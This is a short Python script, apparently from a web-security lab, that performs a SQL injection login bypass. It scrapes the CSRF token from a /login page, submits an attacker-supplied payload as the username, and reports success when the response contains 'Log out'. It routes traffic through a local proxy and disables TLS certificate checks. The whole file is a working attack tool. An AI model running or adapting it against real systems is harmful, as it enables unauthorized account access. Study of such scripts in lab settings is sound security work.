import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings()

proxies={
    'https':'https://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080',
}
path='/login'
def get_csrf(url,session):
    s=session.get(url+path)
    bs=BeautifulSoup(s.text,'html.parser')
    csrf=bs.find('input')['value']
    return csrf

def exploit_sqli(session,url,payload):
    csrf=get_csrf(url,session)
    data={
        'csrf':csrf,
        'username':payload,
        'password':'test',
    }
    f_path=url+path
    r=session.post(f_path,data=data,verify=False)
    if 'Log out' in r.text:
        return True
    else:
        return False
    

if __name__=='__main__':
    try :
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        s=requests.Session()

        if exploit_sqli(s,url,payload):
            print("[+] SQLInjection Successfull")
        else:
            print("[+] SQLInjection unsuccessfull")
    except IndexError:
        print(f"[-] usage {sys.argv[0]} <url> <payload>")
        exit(-1)
